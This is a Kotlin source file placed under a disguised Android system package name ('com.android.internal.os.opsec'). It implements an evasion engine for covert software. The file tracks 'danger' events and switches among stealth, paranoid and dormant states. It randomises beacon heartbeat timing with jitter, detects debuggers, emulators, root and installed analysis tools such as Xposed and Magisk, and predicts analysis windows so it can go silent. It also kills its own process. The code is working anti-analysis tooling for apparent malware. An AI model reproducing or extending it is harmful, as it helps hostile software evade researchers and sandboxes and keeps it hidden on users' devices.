package com.android.internal.os.opsec

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.SystemClock
import kotlin.math.max
import kotlin.math.min
import kotlin.random.Random

enum class SecurityState {
    NORMAL,
    STEALTH,
    PARANOID,
    DORMANT,
    DEAD
}

data class DangerEvent(
    val timestamp: Long,
    val source: String,
    val severity: Float
)

class MonitorEngine private constructor() {

    private var currentState = SecurityState.NORMAL
    private var context: Context? = null

    private val dangerHistory = mutableListOf<DangerEvent>()
    private val scanPatterns = mutableMapOf<String, MutableList<Long>>()
    private var lastStateTransition = SystemClock.elapsedRealtime()
    private var totalDormantCycles = 0
    private var consecutiveSafeCycles = 0L

    var state: SecurityState
        get() = currentState
        private set(value) {
            if (value != currentState) {
                currentState = value
                lastStateTransition = SystemClock.elapsedRealtime()
                onStateChange(value)
            }
        }

    fun init(ctx: Context) {
        context = ctx
    }

    fun reportEvent(source: String, severity: Float) {
        val now = SystemClock.elapsedRealtime()
        dangerHistory.add(DangerEvent(now, source, severity))
        if (dangerHistory.size > 200) dangerHistory.removeAt(0)

        scanPatterns.getOrPut(source) { mutableListOf() }.apply {
            add(now)
            if (size > 50) removeAt(0)
        }

        reevaluateState()
    }

    fun getRecommendedHeartbeatMs(): Long {
        val baseHeartbeat = when (currentState) {
            SecurityState.NORMAL -> Random.nextLong(240000, 420000)
            SecurityState.STEALTH -> Random.nextLong(480000, 900000)
            SecurityState.PARANOID -> Random.nextLong(900000, 1800000)
            SecurityState.DORMANT -> Long.MAX_VALUE
            SecurityState.DEAD -> Long.MAX_VALUE
        }
        val jitter = (baseHeartbeat * 0.15 * (Random.nextDouble() - 0.5)).toLong()
        return max(60000, baseHeartbeat + jitter)
    }

    fun getNextActionDelayMs(): Long {
        val base = when (currentState) {
            SecurityState.NORMAL -> Random.nextLong(10000, 60000)
            SecurityState.STEALTH -> Random.nextLong(60000, 300000)
            SecurityState.PARANOID -> Random.nextLong(300000, 900000)
            SecurityState.DORMANT -> Random.nextLong(3600000, 7200000)
            SecurityState.DEAD -> Long.MAX_VALUE
        }
        return base + (base * 0.2 * (Random.nextDouble() - 0.5)).toLong()
    }

    fun predictNextDangerTimeMs(): Long? {
        if (dangerHistory.isEmpty()) return null
        val recent = dangerHistory.filter {
            SystemClock.elapsedRealtime() - it.timestamp < 86400000
        }
        if (recent.size < 3) return null

        val intervals = mutableListOf<Long>()
        for (i in 1 until recent.size) {
            intervals.add(recent[i].timestamp - recent[i - 1].timestamp)
        }
        if (intervals.isEmpty()) return null
        val avgInterval = intervals.average().toLong()
        val lastDanger = recent.last().timestamp
        val predictedNext = lastDanger + avgInterval
        val now = SystemClock.elapsedRealtime()
        return if (predictedNext > now && predictedNext - now < 86400000) predictedNext else null
    }

    fun shouldExecuteAction(): Boolean {
        if (currentState == SecurityState.DEAD) return false
        if (currentState == SecurityState.DORMANT) {
            val nextDanger = predictNextDangerTimeMs()
            val now = SystemClock.elapsedRealtime()
            if (nextDanger != null && now > nextDanger - 300000) return false
            return Random.nextFloat() < 0.1
        }
        return true
    }

    fun canTransitionTo(target: SecurityState): Boolean {
        val timeInState = SystemClock.elapsedRealtime() - lastStateTransition
        return when (currentState) {
            SecurityState.NORMAL -> timeInState > 120000
            SecurityState.STEALTH -> timeInState > 300000
            SecurityState.PARANOID -> timeInState > 600000
            SecurityState.DORMANT -> timeInState > 1800000
            SecurityState.DEAD -> false
        }
    }

    fun getDangerScore(): Float {
        val now = SystemClock.elapsedRealtime()
        val window = 3600000L
        val recent = dangerHistory.filter { now - it.timestamp < window }
        if (recent.isEmpty()) return 0f
        val decayed = recent.map { e ->
            val age = now - e.timestamp
            val decay = max(0.1f, 1f - age.toFloat() / window)
            e.severity * decay
        }
        return min(1f, decayed.sum() / 10f)
    }

    fun checkEnvironment(ctx: Context): EnvironmentProfile {
        val profile = EnvironmentProfile()
        profile.debuggerAttached = checkDebugger()
        profile.emulatorDetected = checkEmulator(ctx)
        profile.rootDetected = checkRoot(ctx)
        profile.analysisTools = detectAnalysisTools(ctx)
        profile.dangerScore = getDangerScore()
        return profile
    }

    private fun checkDebugger(): Boolean {
        return android.os.Debug.isDebuggerConnected() || android.os.Debug.waitingForDebugger()
    }

    private fun checkEmulator(ctx: Context): Boolean {
        if (Build.FINGERPRINT.startsWith("generic") ||
            Build.FINGERPRINT.startsWith("unknown") ||
            Build.MODEL.contains("google_sdk") ||
            Build.MODEL.contains("Emulator") ||
            Build.MODEL.contains("Android SDK built for x86")
        ) return true
        val features = ctx.packageManager?.getSystemAvailableFeatures() ?: return false
        val emuFeatures = listOf(
            "android.hardware.type.pc",
            "android.hardware.type.watch"
        )
        return emuFeatures.any { feat ->
            features.any { f -> f.name == feat }
        }
    }

    private fun checkRoot(ctx: Context): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        )
        return paths.any { java.io.File(it).exists() }
    }

    private fun detectAnalysisTools(ctx: Context): List<String> {
        val found = mutableListOf<String>()
        val packages = ctx.packageManager?.getInstalledPackages(0) ?: return found
        val analysisPkgs = setOf(
            "com.appsamurai.stonehenge",
            "com.versaapp.tool",
            "com.ngen.mobile.analyzer",
            "eu.chainfire.rootcloak",
            "com.saurik.substrate",
            "de.robv.android.xposed.installer",
            "com.topjohnwu.magisk",
            "com.koushikdutta.superuser",
            "com.noshufou.android.su",
            "com.thirdparty.superuser",
            "com.superuser"
        )
        for (pkg in packages) {
            if (pkg.packageName in analysisPkgs) {
                found.add(pkg.packageName)
            }
        }
        return found
    }

    private fun reevaluateState() {
        val score = getDangerScore()
        val nextDanger = predictNextDangerTimeMs()
        val now = SystemClock.elapsedRealtime()
        val nearDanger = nextDanger != null && now > nextDanger - 600000

        when {
            score > 0.7f || nearDanger -> transitionTo(SecurityState.DORMANT, force = true)
            score > 0.4f -> transitionTo(SecurityState.PARANOID)
            score > 0.15f -> transitionTo(SecurityState.STEALTH)
            else -> {
                consecutiveSafeCycles++
                if (consecutiveSafeCycles > 10 && currentState != SecurityState.NORMAL) {
                    transitionTo(SecurityState.NORMAL)
                }
            }
        }
    }

    private fun transitionTo(target: SecurityState, force: Boolean = false) {
        if (force || canTransitionTo(target)) {
            state = target
            consecutiveSafeCycles = 0
        }
    }

    private fun onStateChange(newState: SecurityState) {
        when (newState) {
            SecurityState.DORMANT -> totalDormantCycles++
            SecurityState.DEAD -> killProcesses()
            else -> {}
        }
    }

    private fun killProcesses() {
        android.os.Process.killProcess(android.os.Process.myPid())
    }

    data class EnvironmentProfile(
        var debuggerAttached: Boolean = false,
        var emulatorDetected: Boolean = false,
        var rootDetected: Boolean = false,
        var analysisTools: List<String> = emptyList(),
        var dangerScore: Float = 0f
    )

    fun getReport(): String {
        val sb = StringBuilder()
        sb.appendLine("=== Monitor Engine ===")
        sb.appendLine("State: $currentState")
        sb.appendLine("Score: ${"%.2f".format(getDangerScore())}")
        sb.appendLine("Dormant Cycles: $totalDormantCycles")
        sb.appendLine("Recent: ${dangerHistory.takeLast(5).joinToString { "${it.source}(${"%.2f".format(it.severity)})" }}")
        val nextDanger = predictNextDangerTimeMs()
        if (nextDanger != null) {
            val remaining = (nextDanger - SystemClock.elapsedRealtime()) / 1000
            sb.appendLine("Next Danger: ${remaining}s")
        }
        sb.appendLine("HB: ${getRecommendedHeartbeatMs() / 1000}s")
        sb.appendLine("Exec: ${shouldExecuteAction()}")
        return sb.toString()
    }

    companion object {
        @Volatile
        private var instance: MonitorEngine? = null

        fun getInstance(): MonitorEngine {
            return instance ?: synchronized(this) {
                instance ?: MonitorEngine().also { instance = it }
            }
        }
    }
}
